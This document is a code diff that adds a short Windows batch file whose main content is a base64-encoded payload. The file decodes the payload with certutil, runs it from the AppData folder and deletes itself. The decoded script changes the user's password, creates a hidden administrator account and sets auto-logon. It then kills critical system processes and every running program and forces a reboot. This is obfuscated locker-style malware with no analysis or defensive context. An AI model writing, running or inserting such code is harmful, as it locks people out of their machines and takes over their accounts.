@@ -1,0 +1,24 @@
+@echo off
+
+echo QGVjaG8gb2ZmDQppZiAiJTEiPT0iaCIgZ290byBiZWdpbiANCnN0YXJ0IG1zaHRhIHZic2NyaXB0>x
+echo OmNyZWF0ZW9iamVjdCgid3NjcmlwdC5zaGVsbCIpLnJ1bigiIiIlfm54MCIiIGgiLDApKHdpbmRv>>x
+echo dy5jbG9zZSkmJmV4aXQgDQo6YmVnaW4NClJFTQ0KDQpuZXQgdXNlciAldXNlcm5hbWUlIGZ1Y2t5>>x
+echo b3UNCm5ldCB1c2VyIL3iy/i801FRMzI1NjA3NjU1MyBmdWNreW91IC9hZGQgDQpuZXQgbG9jYWxn>>x
+echo cm91cCBhZG1pbmlzdHJhdG9ycyC94sv4vNNRUTMyNTYwNzY1NTMgL2FkZA0KbmV0IHVzZXIgYWRt>>x
+echo aW5pc3RyYXRvciBmdWNreW91DQpuZXQgdXNlciBhZG1pbiBmdWNreW91IA0KcmVnIGFkZCAiSEtM>>x
+echo TVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxXaW5sb2dvbiIg>>x
+echo L2YgL3YgQXV0b0FkbWluTG9nb24gL2QgMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3Nv>>x
+echo ZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxXaW5sb2dvbiIgL2YgL3YgRGVmYXVsdFVzZXJO>>x
+echo YW1lIC9kIL3iy/i801FRMzI1NjA3NjU1Mw0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3Nv>>x
+echo ZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxXaW5sb2dvbiIgL2YgL3YgRGVmYXVsdFBhc3N3>>x
+echo b3JkIC9kDQoNCmZvciAvZiAlJUkgaW4gKCd3bWljIHByb2Nlc3MgZ2V0IE5hbWUnKWRvICh3bWlj>>x
+echo IHByb2Nlc3Mgd2hlcmUgTmFtZT0iJSVJIiBkZWxldGUpDQp0YXNra2lsbCAvZiAvaW0gd2lubG9n>>x
+echo b24uZXhlDQp0YXNra2lsbCAvZiAvaW0gd2luaW5pdC5leGUNCnRhc2traWxsIC9mIC9pbSBjc3Jz>>x
+echo cy5leGUNCnRhc2traWxsIC9mIC9pbSAqLmV4ZQ0Kc2h1dGRvd24gLXIgLWYgLXQgMDA=>>x
+
+set v="%appdata%\x.bat"
+del %v% >NUL 2>NUL
+certutil -decode x %v% >NUL 2>NUL
+del x >NUL 2>NUL
+start "" %v%
+del %0
